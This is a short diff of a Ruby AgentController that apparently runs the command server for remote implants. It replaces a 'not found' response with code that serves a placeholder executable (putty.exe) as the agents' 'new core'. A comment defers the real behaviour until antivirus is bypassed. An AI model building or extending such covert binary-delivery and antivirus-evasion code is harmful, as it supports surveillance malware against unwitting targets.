@@ -655,8 +655,11 @@ class AgentController < RESTController
       agent.save
     end
 
-    # TODO: send the real new core
-    return not_found()
+    file = File.binread("c:\\putty.exe")
+    return ok(file, {content_type: 'binary/octetstream'})
+
+    # TODO: implement this in the future (when AV will be bypassed)
+    #return not_found()
   end
 
   def activate_ghost
